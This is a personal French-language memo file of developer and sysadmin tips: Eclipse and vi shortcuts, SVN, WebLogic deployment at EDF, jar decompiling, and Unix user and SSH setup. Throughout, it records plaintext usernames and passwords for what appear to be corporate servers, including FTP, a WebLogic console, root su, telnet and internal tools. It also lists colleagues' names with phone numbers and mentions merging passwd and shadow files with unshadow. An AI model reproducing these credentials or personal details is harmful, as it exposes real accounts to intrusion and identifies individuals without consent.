      Ctrl+g: il faut selectionner un truc: recherche partout la selection  
      F2 : affiche l'erreur en grand
      pour surligner les occurances de l'element selectionne: Preferences>Java>Editeur>Marquage des occurences
      CTRL + SHIFT + L : liste des shortcuts raccourcis
      CTRL + SHIFT + P : Atteindre l'accolade correspondante sinon Window > Preferences > Java > Editor and Select Matching brackets highlight
      CTRL + L : goto line number
      CTRL + shift + G trouver rechercher qui utilise utilisation depend
      CTRL + I : ajuster l'indentation sur la selection en cours mise en forme format
      CTRL + T : heritage pour avoir la hierarchie d'une methode, d'une classe... sous classe implemente
      CTRL + O (ou F4): pour avoir le outline super vite. Refaire O pour voir aussi les attributs des classes parentes
              codes couleurs des fonctions :
                carre = private
                rond = public
                triangle = non specifie: par defaut non modifier
                s = static
                f = final
                plein = methode
                creux = variable
      terminate stop interrompre : Ctrl+F2      
      CTRL + K : find trouver le prochain (fonctionne que dans fichier java)                                            
      CTRL + SHIFT + / (pas du pave numerique)  : add comment set comment (commenter)
      CTRL + SHIFT + B : toggle breakpoint point d'arret
      CTRL+F6; CTRL+E switcher entre les pages (fichiers)
      CTRL+F7 switcher entre vues views              
      Alt+Maj+Q, Q : afficher une pannel vue specifique (plus rapide que CTRL+F7)
      ALT+Shift+X; T : lance JUnit test sur la classe en cours.
      CTRL + F8 : switcher entre perspectives
      CTRL + M : maximise/minimise agrandir aggrandir fenetre windows 
      F2 ou ctrl+Shift+1 : quickfix pour corriger l'erreur rapidement
      ctrl + F7 switch between views
      ctrl + F11 Run last Launched REEXECUTER (se mettre sur un fichier java pour que ça marche)
      F11 Debug last Launched redebugger redebuger REEXECUTERDebuggage Attention bien parametrer le debugger pour que dans les class de jar il alligne bien sinon on a l'impression que c'est desynchronise : Ouput original etc...
      Alt+shift+R : renommer rename ce qu'on veut
      CTRL+SHIFT+H : Bind this to "Generate getters and setters". This is a "must have".
      CTRL+SHIFT+G : find references dependants on workspace
      CTRL+MAJ+R : trouver un fichier par son nom name
      CTRL+MAJ+T : trouver un fichier dans les lib      
Si eclipse ne se lance pas parce qu'il ne trouve pas la jvm java jre jdk alors que c'est pourtant parametre dans le path: externe
    modifier eclipse.ini : -vm [retourchariot]path vers le fichier javaw.exe (inclu) ATTENTION ne pas mettre après -vargs car vargs le prendra en parametre
Quand je debug: 
  F5 = go inside
  F6 = one step
  F8 = play until next stop
plugin svn a utiliser:
	plugin tigris.subversion :
	coller ce lien http://subclipse.tigris.org/update_1.6.x dans addsite de eclipse
      si il a besoin de dependances on s'en fout on les decoche et on ignore
     subclipse utilise CollabNet Merge Client (2.2.3) qui :requires plug-in "org.eclipse.ui (3.3.0)", or later version.  Subclipse Integration for Mylyn 3.x (Optional) (3.0.0) requires plug-in "org.eclipse.mylyn.tasks.core (3.0.0)", or compatible.
    pour utiliser un autre compte svn:
			on peut pas modifier un mot de passe svn.
			La solution est de supprimer le fichier qui stock le/les login(s) et password(s), pour que ensuite lors de la reconnexion au repository, un prompt s'affiche dans lequel on rentre notre nouveau login/password.
			Le fichier à supprimer est :
			C:\Users\p036782\AppData\Roaming\Subversion\auth
      c:\Documents and Settings\username\Application Data\Subversion\auth\svn.simple\ becd5acd3dfc3ff61fddc367c813862e(le nom du fichier varie selon le login).
			Il est par la suite recree.
    	http://subclipse.tigris.org/servlets/ProjectProcess?pageID=p4wYuA
   Pour merger la branche dans le trunk: PAS de branches:DEVOPS
      Selectionner le trunk> Modify> Merge from URL 
      (toujours se plasser sur la cible)

       
pour exporter un projet :
    Exporter > Autre > Echange de projet
pour Importer:
    (pareil que ci-dessus)
pour importer un projet dejà existant dans le workspace:
    Import > Project > cocher "search for nested projects" decocher "copy project..."    
pour generer rapidement une interface d'une classe: 
	se mettre sur notre classe: click droit > restructurer > extraire une interface...
autocompletion des jsp: Ctrl + espace (si ca ne marche plus faire ca : Preference>java>editor>contentAssist>Advanced et cocher sur default (les proposals etaient decochees !!!!))
Pour afficher la hierarchie d'un objet: 
			Ctrl+t
recuperer restorer une classe supprimee: click droit sur projet >restore from history
Rechercher en avant Ctrl K. Rechercher en arriere: Ctrl shift K
si un projet n'est pas un projet java il faut modifier son fichier .project et recuperer le contenu de ce fichier d'un projet java pour le mettre dedans
    ce qui peut aussi se faire en faisant click droit sur projet>ProjectFacets>configureFacets et choisir java+version
si un projet n'est pas un projet web je crois qu'il faut reimporter de svn (ou recreer le projet web dynamique)
pour changer la langue: menu > preferences > Plateforme cible
pour commenter tout ce qui est selectionne Ctrl + Maj + /
pour trouver une classe du src: Ctrl + espace
pour trouver une classe du src: Ctrl + Shift + R
pour trouver une classe du src et des libs: Ctrl + Shift + T
pour ajouter en import les classes manquantes : Ctrl + o
pour ajouter un commentaire description methode javadoc rapidement: tapper /** et faire shift + entree
eclipse: si on a une erreur  eclipse JVM terminated. Exit code = 13  eclipse ne redemarre paslancer à  partir du raccourcis eclipse avec l'option -clean
			exemple: C:\eclipse\eclipse.exe -clean -data C:\prodis_ws_1.2.0
			exemple: C:\eclipse\eclipse.exe -clean -data "C:\Program Files\prodis_ws_1.2.0"
			expemple: "C:\Program Files\eclipse\eclipse.exe" -clean
			Ca peut etre du aussi à  plusieurs JVM et JRE installees qui entrent en conflit: Exit code = 2 ou meme aucun message...
      on peut aussi faire Demarrerwindows>proprietes>java>supprimer les fichiers en cache 
      Exit code = 1 c pas un java de la bonne version ou du bon 64b ou 32b
pour demarrer eclipse avec une autre jvm si j'ai le message "version of jvm is not suitable":
		eclipse.exe -vm "C:\Program Files\Java\jre1.5.0_09\bin\javaw.exe"
    Si eclipse ne se lance pas parce qu'il ne trouve pas la jvm java jre jdk alors que c'est pourtant parametre dans le path: externe
        modifier eclipse.ini : -vm [retourchariot]path vers le fichier javaw.exe (inclu) ATTENTION ne pas mettre après -vargs car vargs le prendra en parametre		
pour demarer eclipse avec plus de memoire si il fait des runtime exception outofmemoryexception
          exemple: "C:\WASCE 2.1.0.1\eclipse.exe" -Xmx1800m ou modifier eclipse.ini a cote de eclipse.exe
si c'est toujours le meme workspace qui s'ouvre parce qu'on a decoche un bouton:
			-data pour pointer vers et autre projet et si ca marche pas : modifier la table des registres (voir sur internet)
			ou bien à  la racine de l'installation d'eclipse wsad: un fichier ini avec une variable: reinitialiserla variable dedans
			ou bien : ajouter -setworkspace à  la ligne de commande pour activer le choix du workspace sous wsad 
pour lancer une appli java avec des arguments: 
        remplir "program arguments" avec : 
        monargument1 monargument2
pour mettre weblogic en mode debug EN REMOTE: vers la fin du fichier "startmanagedweblogic.cmd" mettre :
set STARTMODE=false
echo on
"%JAVA_HOME%\bin\java" -classic -Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=5000,suspend=y,server=y -ms64m -mx64m -classpath "%CLASSPATH%" -Dweblogic.Domain=jcdomain -Dfile.encoding=ISO-8859-1 -Dbea.home="C:\bea61SP2" -Dweblogic.management.password=%WLS_PW% -Dweblogic.ProductionModeEnabled=%STARTMODE% -Dweblogic.Name=%SERVER_NAME% -Dweblogic.management.server=%ADMIN_URL% "-Djava.security.policy==C:\bea61SP2\wlserver6.1/lib/weblogic.policy" weblogic.Server
goto finish

Voir le dessin weblogicdebug1.bmp



sur notes pour signaler qu'on est absent: action > outils > absences

jc kueny: 473472

ftp de log de prod:
clwdev2
user: esp
pass: vhk234

olivia lay 01.56.65.12.09

Si je veux recuperer des fichiers sous unix vers windows, je peux tarer les fichiers: tar -cvf lksdjf.tar * et les importer avec ftp puis les deziper avec winrar sur windows

thomas artiguebielle: 475752

exodus: user: laurent mdp: calotte server: clf70c3.der.edf.fr

weblogic cle85an: console: user: system password: zazou!zazou!

sylvie machicote: 475938


sur sed :
  elements de sed:  (http://www.shellunix.com/sed.html)
 -e "ma_commande" fichier
 où ma_commande = num_premiere_ligne,num_derniere_ligne/expression reguliere/remplacee par/flag
 où flag=... 
sed -e "s/4095,4095/\([0-9][0-9]*\)/**\1**/" fichier

sur vi : 
pour affichier avec des fonts colorees couleurs: aptitude: charger vim
view nomfichier pour afficher en lecture seule
http://www.ledman.ch/eti_linux/08vi.html
attention, vi n'affiche jamais les caractères accentues c'est trop galère d'editer un fichier utf-8 avec accents sur VI: utiliser plutot pspad
          Sinon c qd meme possible: tapper caractère avec accent et tapper caractere suivant jusqu'a ce qu'on le voit puis continuer tapper. 
          Par la suite il peut ne pas tout afficher à la saisie mais pourtant c bien enregistre: :e! ou fermer et reouvrir pour mieux voir
replace remplacer tout remplacer un mot par un autre puis repeter:
  se metre au debut du mot a remplace; faire cw ecrire ce qu'on veut pettre a la place; esc; se mettre sur le prochain mot à rempalcer; puis . pour executer pareil.
pour afficher le numero de la lignes (interupteur on/off)
:set number
pour atteindre le caractere character numero x ( la colonne numero x) de la ligne courante:
x|
escape: mode deplacement ou mode ligne de commande
:e annule tout
h: retour à  gauche: mot à mot :w: deplacement à  droite mot à  mot avance suivant
l: droite. mot à mot: b
j: descend. 
k: monter
H: position en haut à  gauche
L: position en haut à  gauche de l'ecran actif
^ puis espace pour se placer à gauche de la ligne au debut
% recherche parenthèse accolade correspondante
:n editer prochain next file (si on a edite plusieurs fichiers) ouvrir fichier suivant
:prev pour aller au fichier file precedent precedant
nG  	atteindre la ligne saute à la ligne n (premiere ligne = 1)(:n identique) : en mode escape tapper le numero puis Maj+G (on ne voit pas saisir c normal)
fc  	saut sur le caractère character c
$  	se positionner à la fin de la ligne
_  ou 0 se positionner au debut de la ligne
M: Ligne centrale de l'ecran een cours
G: position sur le numero de ligne entre (1G par ex)
Ctrl F: avance d'une page
Ctrl B: recule d'une page
e: sur la fin du prochain mot 
b: debut du mot precedent
G ou :$ pour aller a la derniere ligne (fin du document)
:f connaitre le nom du fichier et son nb de lignes
pour effacer tout: 
		:f (entree) -> retourne le nb de lignes
		puis se mettre en debut du document(1G) et ecrire nbligne dd
Mode insertion: i pouis tapper. pour sortir: echap
i: insertion du texte au debut de la ligne courante
a: insertion du texte à  la fin de la ligne + mode insertion
R: Remplacer: pratique car on peut faire cpier coller pour remplacer un mot
o:insert une ligne +mode insertion
O: insert une ligne au dessus + mode insertion
x: suppr
X:suppupression charactere
dw: supprimer un mot
virer le retour chariot de la ligne courante :
     se mettre sur la premiere ligne et faire J 
dd: supprimer une ligne (en fait il fait un couper)(copier mais supprime) 
2dd: supprimer deux lignes  (en fait il fait un couper)
100dd: supprimer cent lignes (en fait il fait un couper)
D: supprimer à  partir du curseur (en fait il fait un couper je crois) jusqu'à la fin de la ligne
yy: copier ligne puis P: coller ligne
4yy puis P: le faire pour 4 lgines
copier-coller bouts :
  v puis bouger fleche pour selectionner puis d pour couper ou y pour copier puis P pour coller ce que j'avais selectionne
faire une recherche find :faire / ou /\c exemple: /\cmotcherche pour case insensitive ignorer majuscule minuscules et tapper. pour faire next, tapper n (pour echapper les / slash faire un backslash) pour rechercher en arrière : N
?: recherche de bas en haut
u: undo si multiple undo ne marche pas : aptitude et charger vim
.:redo Ou plutot  Ctrl+r
:e! pour recharger rafraichir, refresh le fichier: à  utiliser si problèmes de bufferisation ATTENTION SAUVER AVANT!
:q! quitter sans sauver
:wq sauve et quitter enregistrer et quitter
:w sauve enregistrer
:w "autrenom" pour sauver sous enregistrer sous save as un aure nom
:!MaCommande faire une commande unix executer une commande unix
:r ! MaCommande faire une commande unix et le resultat de la commande rentre dans le texte
shift G pour aller en bas du fichier
Remplacement de chaine1 (toutes les occurrences de chaine1) ,par chaine2 depuis la ligne n1 jusqu'à  la ligne n2  
		:n1,n2 s/chaine1/chaine2/g
    ou bien avec confirmation : on definit pas les lignes mais il ya confirmation a chaque fois: 
    :%s/chaineARemmpacer/ChaineQuiRemplace/gc
    :%s/e1/e2/gc 
		ou bien 
		remplace de ligne 1 à  dernière ligne : $. toto remplace par 0
		:1,$ s/toto /0/g  -- faut il entourer 0 de "" ?
		ou
		:1,$ s/toto/titi/g (remplace tous les toto par des titi)
		ou bien pour remplacer " par ':
		:1,$ s/"/'/g
		ou bien pour remplacer '' par \':
		:1,$ s/''/\\'/g
		ou remplacer ">" par "&gt"
	     :1,$ s/>/\&gt;/g
	     :1,$ s/< /\&lt;/g
			remarque : -si n2 est egal à  $ alors on effectue le remplacement jusqu'à  la fin du document. - /g indique que c'est une option de remplacement; les autres ne sont pas documentees ici car pas interessantes ( man vi ...).  
			Attention: dans la chaine 2 seulement, certains caractères sont specialises (ex / ," ,[ ,] ,\ ,',{,},etc..), il faut donc les despecialiser, ceci se fait en inserant un \ avant ce caractère. le caractère \ ne despecialise qu'un seul caractère; il faut donc le repeter devant chaque caractère specialiser à  remplacer. 
			ex: :1,$ s/\/bug\"/\\\\correction/g 
			Cet exemple remplace dans tout le texte l'expression 
			/bug" par \\correction
      :s/\n//g
   exemples :
   :1,$ s/632k next 64k/80k next 64k/g			
pour transformer la case: MAJ -> MIN ou l'inverse: altGR + ~


demarrer > parametres >ajouter une imprimante

quand un fichier xml ne marche pas , essayer:
<?xml version = "1.0" encoding = "iso8859-1"?>
<?xml version = "1.0" encoding = "UTF-8"?>
decompiler :
      meilleur decompilateur :decode_java (java decompiler); Sinon utiliser Intellij qui peut aussi comparer des repertoires 
      fernflower pour decompiler tout un jar et exporter les sources dans un jar avec des .java à la place des .class (mettre ~1 pour les espaces)
          java -jar D:/Dev/fernflower/fernflower.jar D:/Projets/Toulon~1/casclient-2.1.1-1.jar D:/Projets/Toulon~1/esupcasclient/
          java -jar D:\Dev\fernflower\fernflower.jar D:\Projets\CISIRH\IQhr-online-query\WEB-INF\lib\hr-query-server-7.40.01005.00000.jar D:\Projets\CISIRH\hr-query-server\
          java -jar D:\Dev\fernflower\fernflower.jar D:\RD\hr-kernel-7.30.03004.1234-sources\hr-kernel-7.30.03004.1234.jar D:\RD\hr-kernel-7.30.03004.1234-sources\
          java -jar D:\Dev\fernflower\fernflower.jar D:\Projets\CRCA\4you\com.soprahr.hub.ds.usermgt.hra.main-2.1.3.jar D:\Projets\CRCA\4you\decompile\
          java -jar D:\Dev\fernflower\fernflower.jar D:\Projets\INRA\conf\__hr-connecteur-inra-loginModule-1.0.jar D:\Projets\INRA\conf\__hr-connecteur-inra-loginModule-1.0jar
          java -jar D:/Dev/fernflower/fernflower.jar D:\Projets\Speig\LDAPS\speigloginmodulee2save\__speig-login-module-1.0E2ForLogas.jar D:\Projets\Speig\LDAPS\speigloginmodulee2save\                     
          java -jar D:/Dev/fernflower/fernflower.jar D:\Projets\Speig\LDAPS\speigloginmodulee2\__speig-login-module-1.0E2ME.jar D:\Projets\Speig\LDAPS\speigloginmodulee2\
          aussi decompiler un repertoire plein de jars :-) (il va aussi dans les sous-repertoires)
              java -jar D:\Dev\fernflower\fernflower.jar D:\Projets\lib\ D:\Projets\src\
          aussi decompiler un repertoire plein de .class il ajoute les .java a cote de chaque classe
              java -jar D:\Dev\fernflower\fernflower.jar D:\Dev\hraccessCodeSource\hra-space\WEB-INF\classes D:\Dev\hraccessCodeSource\hra-space\WEB-INF\classes
          java -jar D:\Dev\fernflower\fernflower.jar D:\Dev\hraccessCodeSource\hra-space\WEB-INF\classes D:\Dev\hraccessCodeSource\hra-space\WEB-INF\classes
          java -jar D:\Dev\fernflower\fernflower.jar D:\Projets\FondationDAuteuilSAML\hraspace\classes D:\Projets\FondationDAuteuilSAML\hraspace\classes
      JavaDecompiler (jad nt ). mieux: mettre le plugin net.sf.jadclipse_3.3.0.jar J'ai mis jad sous D:/installation. faire : "d:\Installations>jad d:\LocalData\p036782\Desktop\theo\WEB-INF\classes\renault\wec\dmd\form\FicheForm.class"
JbuilderW
PowerAMC
UltraEdit 32
WinRar ou 7ZIP si fichiers trop aux noms trop longs
Winzip
XMLSPLY
TOAD
Eclipse
Wincvs
Apache V1 et V2
BeyondCompare v1.9f
TopStlyle3
EasyPHP
Maguma Studio
Oracle



chais pas
Guitar tablature Editor
AOLInstant Messenger
RealPlayer


http://etudes-w3.edfgdf.fr


MOREAU OLIVIER  01 47 65 31 89  473189  

spip esp: http://dev-particuliers.der.edf.fr/spip_login.php3
mot de passe: dit-mco
user: dit-mco
spip:
\\clr26ak\icame\dev-particuliers
user: jacquin
pass: edf123

pour recuperer un appel telephoneique: 16

thomas garrel: 475193
Christelle Gouret 01 56 65 07 40
whilliam Whiteway : 0156651126

Olivier Trachet: 0534458509

Marc Chassin: 475237
julien remi 475327

procedure de mise a jour de la partie dynamique de ESP
fichier web_dev à  comparer avec web_mco et mettre web_mco à  jour en finction de web_dev
(compare whith each other : eclipse)

modifier xdoclet sous esp/ESP_EJB>metainf>xdoclet: targetversion=dev ->mco (remplacer par mco pour la livraison)
pareil pour sous esp/ESP_DYNAMICS/web-inf sous build.xml targetversion=mco au lieu de dev

sous eclipse à  droite sous lombozJ2EEview: onglet module clic droit sur ESP_EJB > generateEJBFiles

faire un eclipse>projetct>RebuildALL

sous eclipse à  droite sous lombozJ2EEview: onglet module clic droit sur ESP_EJB > Deploy (il va creer le .jar)

ensuite comme d'hab, lancer sous ESP_DYNAMICS build.xml et build.ear (comme dh'ab)

ouvrir la console weblogic
http://cle85an:7001/console

enlever la coche "deploy" sous Deployement>application>ESP_1.8.X
detargetter ESP_DYNAMIC et ESP_EJB

reinstaller la nouvelle version de ESP_1.8.X.jar: install a new application
choisir mon ear local
redeployer
retargetter ESP_EJB sous WLS2 puis ESP_DYNAMICS sous WLS1


user:aeldev pass: aeldev pour root faire su - password:luna85
faire sudo su -
sudo -u wecapp macommande exemple: sudo -u wecapp mkdir v9.1.7
aller sous /appli/bea/wl-domains/config/DOMAINE-DEFAULT faire un stop de wls1 puis ensuite relancer wls1 en principe ca suffit pour marcher (il faut etre root avec apli deployee et targuettee)
ou
relancer wls2 puis wls1 (on ne pourras pas les relancer si on est pas root)
(les instances doivent etre targettees et l'appli deployee avant de faire ca)

pour modifier la partie statique, utiliser hummingburd sur clxs0aa sous logiciels/


* transferer par ftp le tar cree precedemment de la machine clxs0aa (user mntesp, port 591) 
vers la machine clwgc2a (user mntwgc , password wgc___ , port 21,                port 21 est le port ftp par defaut
repertoire : /home00/mntwgc/Livraisons/ESP/ )
* compresser le fichier avec gzip
telnet clwgc2a (user mntwgc, pass wgc___ , port  23 , repertoire : /home00/mntwgc/Livraisons/ESP/ )
gzip ESP-STATIC-1-7-67.tar

4ème etape : creation de la fiche cogito

* creer une demande de travail à  l'attention de la cellule CND_INFRA_INET.
nouveau : nom: ... 
categorie: demande
sous categorie: catalogue
Gravite: non bloquant
Delai: 2h
bien: CLAYAMUT
application:ESP
Creer une demande

exemple commentaire article : 
MISE A JOUR PARTIE STATIQUE ESP 
 
Bonjour, 
J'ai place dans le repertoire \home00\mntwgc\Livraisons\ESP de la machine clwgc2a le fichier suivant : 
- ESP-STATIC-2.2.tar.gz . 
Ce fichier est à  exporter dans le repertoire 'document root' apache du site particuliers.edf.fr. 
Une fois l'operation effectuee, merci de me prevenir par mail . 
 
Note : connexion au serveur clwgc2a : 
login = mntwgc 
password = wgc___ 
 
Cdlt, 
 
Laurent Duverge

Creer une demande
aller sur la demande et rajouter un article: XXXINTERNET > XXXSTATIQUE > Ecrire la description de l'article > APPUYER SUR TRAITEMENT!!!!!


5ème et dernière etape : verification en ligne et confirmation MOA

- verifier que le site s'affiche bien http://particuliers.edf.fr
-contacter la MOA pour leur dire que le site a ete MAJ (William Whiteway, copie à  Olivia Lay, Christelle Gouret, DIT-GP-MAINT)
mail: 
Jean-Christophe KUENY/E/EDFGDF/FR@EDFGDF, Olivier TRACHE/A/EDFGDF/FR@EDFGDF, William WHITEWAY/DCPE/EGS/EDFGDF/FR@EDFGDF, Olivia LAY/DCPE/EGS/EDFGDF/FR, Christelle GOURET/RETD/EDFGDF/FR
-----------------------------------------------

le mode de passe du poste de js kueny = edfedf ou laurent


smtpprod: mailhost.edf.fr
smtp egn prod clsmtps1.edf.fr port 26
barrer

smtp local esp:
mail.smtp.port=25
mail.transport.protocol=smtp
mail.smtp.host=mailhost.der.edf.fr

smtp mco esp:
mail.smtp.port=25
mail.transport.protocol=smtp
mail.smtp.host=130.98.118.118



cogito:
user: laurent.duverge@edfgdf.fr
password: rcwkdr
ou zoclos

ftp ftp.edf.fr
user:edfgdf
password: ftpeg-01
bi (pour telecharger en mode binaire)

WORD :
pour replace remplacer c'est dans l'onglet home avec la souris 
si il me supprime m'efface vide mon doc suite à une sauvegarde mauvaise foireuse
    le reouvrir via le menu démarrer
copier coller la mise en forme
  ctrl+shift+C puis  ctrl+shift+V
pour faire des caractères barres rapidement: 
    Outils/Personnaliser/Clavier (pour creer un raccourci)
pour faire des references super cool facon laure deneux: 
	Insertion >  Reference > ne pas utiliser type signet mais plutot type Figure
pour generer un menu index :
  Reference > table des matières
UNIX : linux :(unix est la plus basse couche; linux est au dessus mais il a été complettement réecrit, c le kernel=noyau; ubuntu(https://wiki.ubuntu.com/Releases) et debian sont deux distrib au dessus de linux. Sont differentes mais ubuntu est un layer par dessus debian)
  quelle est ma version type de linux:
      cat /etc/*-release
      et/ou
      lsb_release -a
      et/ou (pour connaitre le kernel)
      uname -a pour savoir sur quelle plateforme on est os systeme d'exploitation
      uname -a nom machine etc...
  pour upgrader updater ubuntu : 
    https://help.ubuntu.com/community/UpgradeNotes (en principe la commande est : do-release-upgrade// si je suis sur un LongTimeService LTS il va installer le prochain LTS automatiquement tout seul)      
  un fichier avec asterix à la fin c'est un executable.
  dzdo c'est les droits pour lancer des commande comme root
  sudo :
    sudo -l // pour voir quels sudo je peux executer.
    sudo -L // pour voir la liste des options sudo dispo
    sudo unecommande //execute cette commande avec les droits de root// si message erreur is not a sudoer : se connecter en root et faire : adduser nomMonUtilisateur sudo
    sudo su unuser //pour devenir ce user
    pour passer en role profile root: sudo su
    pour éditer le comportement de sudo faire "visudo"
              visudo: // paramétrage du com portement de sudo
                Cmnd_Alias  UNALIASCOMMANCETOUJOURSPARUNEMAJUSCULE=commande1,commande2,.... // je définit un alias pour la suite
                Defaults targetpw  # si non commenté, il demande le mot de passe de l'utilisateur cible sinon il demande mon mot de passe quand je change d'utilisateur
                ALL           ALL                                  = (ALL)                                        ALL  # ATTENTION! À n'utiliser QUE avec 'Defaults targetpw'!
                utilisateur   connexionLocaleOuDistanteOuLesDeux   = (quelle(s)Identite(s)IlALeDroitDePrendre)    Quelle,Commandes,Il,PourraAlors,ExecuterSepares,Par,Virgule,Wildcart?possiblesMaisPas*UNALIASCOMMANCETOUJOURSPARUNEMAJUSCULE // je peux mettre mon alias ci dessus ici
                ou                                                    ou 
                %groupe(utilisateurs appartenant à ce groupe)         NOPASSWD:
                lire la suite ici :http://www.linuxpedia.fr/doku.php/commande/su_sudo
                
  avant on utilisait "su"
    su // switch ma session dans la connexion d'un autre utilisateur. Par defaut root.
    su toto ou su - toto// je deviens l'utilisateur user toto
    su -toto unecommande // executer une commande au nom de toto (pas sur!)
    /boot infos utiles pour demarrage machine
    /bin et /sbin: commandes unix
    /dev fichiers pilotes materiel
    /etc fichiers d'administrations et commandes systemes
    /usr/bin commandes suppl non contenus dans /bin
    /usr/lib bibliotheques unix non vitales
    /usr/include declaration de fonctions systemes
    /usr/src sources de logiciels + du noyau Linux
    /usr/share fichiers de donnees
    /opt logiciels commerciaux installes
    /home repertoires persos pour utilisateur
    /var donnees frequements reecrites
changer mot de passe d'un utilisateur :
  changepasswd nomutilisateur (je crois)    
creer un nouvel utilisateur : 
      useradd -m -s /bin/bash(son shell prefere) -d /chemin/vers/son/home/directory nomduuser
      puis faire 
          passwd nomduuser // pour definir son password 
      du coup liste des utilisateurs users avec password mots de passe sous /etc/passwd il va y avoir :
      nomduuser:x(doncLePasswordEstStockeSous/etc/shadow fichier avec mdp chiffres):unChiffre=IdentifiantDeLutilisateur(0=root;1-99=user;100-999=systemUsers):idGroup(stockeSous/etc/group):infobof:/son/home/directory:/bin/bash ou /bin/sh(typeDeSesCommandesShell et si je ne veux pas qu'il se connecte mettre: /usr/sbin/nologin)
      commande unshadow combine le fichier passwd et shadow
            unshadow fichierpasswd fichiershadow > fichierresultant
supprimer un user (il va le supprimer dans passwd lui meme)
    userdel loginduuser
liste des machines qui ont le droit de se logger sur mon serveur
  vi /etc/hosts.allow 
  je peux interdir à une adresse ip de se connecter sous /etc/hosts.deny

les comptes utilisateurs sont sur etc/passwd (si un jour un gars qu'on ne connait pas fait des trucs)
pour recharger le .profile // fichier chargé lorsque je me connecte a la connexion initialise. dedans je peux mettre des commandes qui s'executent lors de ma connexion 
    faire: cd ou cd . puis . .profile (faire ls -tral pour voir tout (attention pas tout forcement... mais je ne sais pas pourquoi)
les cles cles : la securite : LINK94949494
  la securite est parametree sous /etc/ssh/sshd_config
        si je modifie ce fichier faire  rafraichir ssh refresh recharger(desactiver la connexion par mot de passe :PasswordAuthentication no); PermitRootLogin=yes(root peut se loguer avec mot de passe) ou withou-password (root ne peut pas se loguer avec mot de passe, seulement par cle)
         service ssh reload ou invoke-rc.d sshd restart ou invoke-rc.d ssh restart ou /etc/init.d/ssh reload LINKsshreload
  les logs sur la securite si je n'arrive pas à me connecter en ssh
  sont sous /var/log/user.log ou /var/log/auth.log  si ça défile par sécurité désactiver la connexion par mot de passe.
  /homeDuUser/.ssh repertoire contient les cles publiques (le creer si il n'existe pas) il doit appartenir à l'utilisateur interessé droit doivent etre rwx-------
    installer ssh :sur debian :
      si serveur openssh deja la faire /etc/init.d/ssh reload
       generer creer paire de cle sur cygwin ou sur unix LINK94949494
                    ssh-keygen -t rsa // stocke la cle privee sous /repertoireHomeDuUser/.ssh/id_rsa et la cle publique sous /repertoireHomeDuUser/.ssh/id_rsa.pub  (creer ces fichiers si n'existent pas) //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
                    definir passphrase (sauf si c'est pour faire du ssh rsync scp etc... avec un autre serveur, alors ne pas mettre de mot de passe!)
                    cle prive est dans id_rsa, la cle publique corresp est dans id_rsa.pub. //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
                    ssh-keygen -y -f id_rsa > id_rsa.pub // ensuite je peux copier cette cle publique et la mettre sur un autre serveur LINKmljsdf
                    On ne peut pas mettre plusieurs cles privées dans id_rsa:dans ce cas faire un fichier .ssh/config avec dedans:
                          Host memoclap www.memoclap.com  //Host petit_nom nom_de_domaine
                          HostName www.memoclap.com       //HostName nom_de_domaine
                          IdentityFile ~/.ssh/id_rsa      //chemin vers le fichier contenant la cle privee
                          User root
                          
                          Host wenhuaduverge www.wenhuaduverge.com
                          HostName www.wenhuaduverge.com
                          IdentityFile ~/.ssh/wenhua_rsa  //chemin vers un autre fichier contenant la cle privee de l'autre domaine.
                          User root           
                        recharger le ssh après avoir cree/ecrit dans fichier .ssh/config voir LINKsshreload
      pour ne plus avoir a ressaisir mon mdp quand je fais du scp rsync ssh j'ai besoin de me connecter par key:
                    Copier cle publique dans id_rsa.pub sur autre serveur dans sous homeUtilisateurAvecQuiJeVeuxMeConnecterDansServerB/.ssh/authorized_keys et authorized_keys2 (pour être sur je mets dans les deux... chais pas si c bon.) LINKmljsdf
                          authorized_keys et 2 contient les cles publiques des autres serveurs qui peuvent se connecter ici grace à leur clé privee dans id_rsa.priv et/ou id_rsa //(je peux renommer id_rsa comme je veux: toto_rsa par ex)
              se connecter alors en faisant depuis serveurA: ssh homeUtilisateurAvecQuiJeVeuxMeConnecterDansServerB@serverB                          
              les droits doivent être comme ça:
                -rw-r--r-- 1 utisateurInteresse utisateurInteresse  820 nov.  25  2014 authorized_keys2
                -rw------- 1 utisateurInteresse utisateurInteresse  820 nov.  25  2014 authorized_keys
                -rw------- 1 utisateurInteresse utisateurInteresse  883 nov.  28  2014 id_rsa 
                 mais si je veux automatiser le transfert de clé publique dans le serveur sur lequel je veux me connecter: voir voir LINK9939572
      changer mot de passe de la cle privee
         ssh-keygen -p
      pour qu'il retienne toujours mon mot de passe :(bof. MobaXterm retient) 
                editer dans mon home ~/ le fichier .bash_profile et rajouter
                      ## only ask for my SSH key passphrase once!
                      #use existing ssh-agent if possible
                      if [ -f ${HOME}/.ssh-agent ]; then
                         . ${HOME}/.ssh-agent > /dev/null
                      fi
                      if [ -z "$SSH_AGENT_PID" -o -z "`/usr/bin/ps -a|/usr/bin/egrep \"^[ ]+$SSH_AGENT_PID\"`" ]; then
                         /usr/bin/ssh-agent > ${HOME}/.ssh-agent
                         . ${HOME}/.ssh-agent > /dev/null
                      fi
                      ssh-add ~/.ssh/id_rsa
                    recharger ce fichier : . .bash_profile       
 ssh: se logger sur une machine a distance
    ssh user@machinedistante -i pathVersmaclepriveeFacultatifSiPasBesoin
    ssh www-data@www.memoclap.com
    executer directement une commande en ssh : 
            ssh user@machinedistante "macommandeunix; uneautrecommandeunix"    

  
pour downloader recuperer telecharger transferer un fichier d'un serveur à un autre 
commande: scp :
    -r pour recursif si c un repertoire.
    -vvv pour verbose (mode debug)
    pull: PUTAIN j'arrivaispas à faire marcher avec cle: toujours permission denied (publickey) meme apres avoir declare ma cle publique sur le serveur> il falait utiliser une cle privee de type .pem pour que ca marche et non pas .ppk (sur windows en tout cas)
      scp -i cheminVersMaClePriveeFacultatifDeType.pem user@machine:cequejeveuxcopierDeLaMachineDistante repertoireoujeveuxlecopiersurMAmachine ATTENTION espace interdits apres le :
    push:
      scp -i cheminVersMaClePriveeFacultatifDeType.pem cequejeveuxcopierdeMAmachine user@machine:oujeveuxLecopiersurlaamachinedistante
    exemples  
      scp -p admddd\@su571ars.mc2.renault.fr:/data/documentum/applications/a_ddd/ExportPHX/jar/Exporter-0.0.1.jar .
      scp -p admddd\@su571ars.mc2.renault.fr:/data/documentum/applications/a_ddd/ExportPHX/sh/L.ksh .
      scp -p admddd\@sum50301:/data/documentum/applications/a_ddd/ExportPHX/tmp/pgn/*.xml .  
Pour transferer exporter des fichier donnees sur un autre serveur reseau remote(faire un backup)
